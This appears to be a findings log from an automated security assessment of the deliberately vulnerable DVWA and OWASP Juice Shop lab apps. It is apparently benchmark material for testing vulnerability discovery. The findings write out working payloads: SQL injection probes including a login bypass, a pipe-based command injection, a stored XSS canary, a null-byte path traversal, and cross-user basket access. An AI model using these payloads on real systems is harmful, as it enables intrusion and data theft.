state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: [security=high] GET /vulnerabilities/sqli/ returned 200 with no form; page links to 'Click here to change your ID' (session-input.php flow). Body shows Security Level: high, SQLi DB: mysql. Query input is taken from server session set via session-input.php, so no direct GET id parameter is used at high.

[security=high] GET /vulnerabilities/exec/ returned 200; form action=/vulnerabilities/exec/ method=POST, fields: ip (text, no maxlength), Submit (submit, value=Submit). Body shows Security Level: high. Blacklist per coordinator: '; ', '| ', '&&'; pipe without trailing space (127.0.0.1|whoami) is the candidate vector for verification.

[security=high] CORRECTION: canary <script id="test_token">window.xss_flag=1</script> is exactly 50 chars and fits mtxMessage maxlength 50. txtName (maxlength 10) must also be supplied since it is a form field. Form GET 200 at high; body Security Level: high. Note session_info metadata still reports 'low' while body reports 'high'; body treated as authoritative.
Observed: current security level = low. Form fields: security (select low/medium/high/impossible), seclev_submit=Submit, user_token hidden (token value observed in dvwa_admin session on this page).
Observed benign GET with empty q: HTTP 200 JSON {status:success,data:[products...]} (id,name,description,price,...). Injection not tested by mapper.
Observed JSON POST {email,password} with nonexistent user: HTTP 401 'Invalid email or password.' Content-Type JSON body expected.

Unauthenticated GET /api/Feedbacks returned HTTP 200 JSON {status:success,data:[...]} with 8 records. Shape: UserId, id, comment, rating, createdAt, updatedAt. Emails are NOT in separate fields; they appear only inside comment text and are MASKED (e.g. '(***in@juice-sh.op)', '(***der@juice-sh.op)', '(anonymous)'). No unmasked email field observed in the response. Email PII exposure is therefore partial/masked, not full.

Observed HTTP 200 open directory listing 'listing directory /ftp/' listing acquisitions.md (909 B), legal.md, package.json.bak (4291 B), coupons_2013.md.bak, incident-support.kdbx, eastere.gg, encrypt.pyc, suspicious_errors.yml, announcement_encrypted.md, quarantine/.
Linked from /ftp/ directory listing (909 bytes). Content not fetched by mapper; verification pending.
Listed in /ftp/ directory (4291 B). Raw-path 403 check and null-byte bypass (%2500.md) not performed by mapper; verification pending.
Observed HTTP 200 browsable directory listing 'listing directory /encryptionkeys/' exposing jwt.pub (248 B) and premium.key (50 B).

findings.title: SQL Injection in id parameter (DVWA SQL Injection) [security=low] - closeout boolean check
findings.response_evidence: [security=low] TRUE condition (id=1' OR '1'='1) returned 5 seeded user records (first names admin, Gordon, Hack, Pablo, Bob; surnames admin, Brown, Me, Picasso, Smith). FALSE condition (id=1' AND '1'='2) returned zero records (no 'ID:' / 'First name:' rows). Both 200, security_level=low in body. Behavioral criteria met for the low instance. Note: the endpoint record's observation_evidence describes a high-level session-input flow; that is a separate high-level instance and was not verified here.

findings.title: OS Command Injection via pipe bypass (ip field) [security=medium]
request_sequence: GET http://dvwa/vulnerabilities/exec/ (dvwa_admin) -> body 'Security Level: medium' after security change
findings.response_evidence: [security=medium] POST ip='127.0.0.1| whoami' returned HTTP 200 with the ping output area containing 'www-data' (the web-process identity). Page body reads 'Security Level: medium'. Pipe '|' bypasses the medium blacklist of ';' and '&&' as expected.

findings.title: Stored XSS in guestbook message field (DVWA XSS (Stored)) [security=low]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> body 'Security Level: low' (session_info security_level=low)
POST http://dvwa/vulnerabilities/xss_s/ form: txtName=verifier, mtxMessage=<script id="test_token">window.xss_flag=1</script>, btnSign=Sign Guestbook (dvwa_admin) -> 200, new entry appended
findings.response_evidence: [security=low] Security level confirmed low in body ('Security level is currently: low' and 'Security Level: low'); the endpoint record's 'high' note is stale. Canary is exactly 50 chars and was accepted by mtxMessage maxlength 50 without truncation. POST returned 200 and the guestbook re-rendered with a new 'Name: verifier' entry. Browser render of /vulnerabilities/xss_s/ as dvwa_admin: browser_eval_js('window.xss_flag') returned 1 (document contains 4 script#test_token elements, including the earlier stored canaries). Behavioral proof: the stored script executed on render.

findings.title: Juice Shop login authentication bypass via SQL injection in email field
request_sequence: POST http://juiceshop:3000/rest/user/login (session=unauth) Content-Type: application/json body: {"email":"' OR 1=1--","password":"x"}
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid JWT was issued for the first user (admin@juice-sh.op) with no valid credentials supplied, proving the email parameter is concatenated into the SQL login query. Token value redacted in this record.

findings.title: Juice Shop product search SQL injection (SQLITE_ERROR and UNION-based data injection in q parameter)
findings.response_evidence: Baseline q=apple: HTTP 200 {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":24,"name":"Apple Pomace",...}]} (normal product rows). Single quote q=qwert': HTTP 500 text/html "Error: SQLITE_ERROR: near \"'%'\": syntax error" (SQL error leaked, differs from benign baseline). UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — attacker-chosen UNION column values (2..9) are reflected in the product record, confirming injection into the query.

findings.title: Juice Shop unauthenticated /api/Feedbacks author email exposure (masked only; not confirmed)
findings.response_evidence: Unauthenticated request returned HTTP 200 {"status":"success","data":[...]} with 8 records (fields UserId, id, comment, rating, createdAt, updatedAt). No separate email field. Emails appear only inside comment text in masked form: "(***in@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)", "(***@juice-sh.op)"; the rest are "(anonymous)". No full author email address is disclosed, so the CWE-359 criterion (disclosure of author email addresses) is not met. Records are unauthenticated, but the PII is partially masked only, so this is rejected as a CWE-359 candidate; it can be reported as a low-severity unauthenticated data exposure at most.

findings.title: Confidential acquisition memo exposed via open /ftp/ directory listing
findings.response_evidence: Listing: 'listing directory /ftp/' HTTP 200 lists acquisitions.md (909 bytes) among others. Direct retrieval: HTTP 200, content-type text/markdown, body begins: "# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..." Confirmed: unauthenticated retrieval of confidential memo text.

findings.title: Browsable encryption-keys directory exposes premium.key and jwt.pub
findings.response_evidence: HTTP 200 text/html. Visible text: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". Links: /encryptionkeys/jwt.pub, /encryptionkeys/premium.key. Directory is browsable without authentication and exposes sensitive key files.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/{id}: acct2 reads acct1's basket 6
findings.response_evidence: Acct1 own basket: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. Acct2 (session_info own_basket_id=7, email acct2_bench@juiceshop.local) received the same object: "id":6,"UserId":22, product "Apple Juice (1000ml)", BasketItem quantity 3, id 9. Acct2 retrieved acct1's distinct seeded item (Apple Juice (1000ml), quantity 3) from a basket it does not own.

findings.title: Poison null-byte path traversal under /ftp/ bypasses .bak extension filter (package.json.bak)
findings.response_evidence:
Raw path: HTTP 403, body "Error: Only .md and .pdf files are allowed!" (fileServer.js verify). Null-byte bypass: HTTP 200 with restricted backup content: "{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application", ... "devDependencies": {...}". Both steps shown; the filter is bypassed by %2500.md.

findings.title: DVWA /security.php security-level change: no demonstrated disclosure or change (no-op POST at low)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> 200, user_token=[REDACTED], security level low
POST http://dvwa/security.php (dvwa_admin) form: security=low, seclev_submit=Submit, user_token=[REDACTED] -> 302 Location: /security.php
findings.response_evidence: The page exposes the admin's security level and CSRF user_token to the admin session only, and the admin session is the one that owns it, so no cross-user disclosure is shown. The POST returned 302 to /security.php (the normal DVWA success response), and session_info still reports security_level low. Because the level was already low, this POST cannot show a level change, so the CWE-200 claim is not demonstrated. Not verified at medium/high. Not a confirmed finding.

findings.title: SQL Injection (numeric boolean, POST id) [security=medium]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> user_token=[REDACTED], body 'Security level currently: high'
findings.response_evidence: [security=medium] TRUE payload 'id=1 OR 1=1' returned 5 seeded records: Surnames admin, Brown, Me, Picasso, Smith (First names admin, Gordon, Hack, Pablo, Bob). FALSE payload 'id=1 AND 1=2' returned no 'ID:' record rows (only the form and 'User ID: 1 2 3 4 5' header). Body still reads 'Security Level: medium'. Note: session_info metadata in the tool output reported security_level 'low' on some calls, but the page body consistently said medium after the change.

findings.title: Basket 7 access as acct2 - not applicable (own basket)
findings.response_evidence: HTTP 200 with session_info.own_basket_id=7 for acct2_bench@juiceshop.local (UserId 23), containing Orange Juice (1000ml) qty 1. Because basket 7 is acct2's own basket, this is not a cross-user access and BOLA is not demonstrated by this request. Rejected for the BOLA class. A valid cross-user test requires requesting acct1's basket ID with the acct2 session, which was not in scope for this pass.

findings.title: DVWA SQL Injection (id via session-input.php) [security=high]
findings.response_evidence: [security=high] Body reports 'Security Level: high' (session_info metadata reports 'low'; body treated as authoritative). TRUE payload 1' OR '1'='1' # returned 5 records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (multiple seeded surnames). FALSE payload 1' AND '1'='2' # returned zero ID/First name/Surname records (only the 'Click here to change your ID' shell and footer).

findings.title: Authenticated whoami endpoint discloses no identity data (rejected)
findings.response_evidence: HTTP 200, application/json, body {"user":{}}. The response contains no profile, email, id, or any other user's data. session_info confirms the caller is acct2_bench@juiceshop.local with own_basket_id 7, but the body itself discloses nothing beyond an empty object. No cross-user data leakage is observed, so this does not meet the CWE-200 criteria.

findings.title: /ftp/ raw backup access control check (403 control recorded; closed out)
findings.response_evidence: Raw GET /ftp/package.json.bak (unauth) returned HTTP 403 with body "Error: Only .md and .pdf files are allowed!" (Express fileServer.js verify). This is the filter control only; the null-byte bypass that yields the file is not re-tested in this pass. The directory listing, acquisitions.md disclosure, and package.json.bak bypass were already confirmed in earlier findings, so this endpoint is closed out here without new findings.
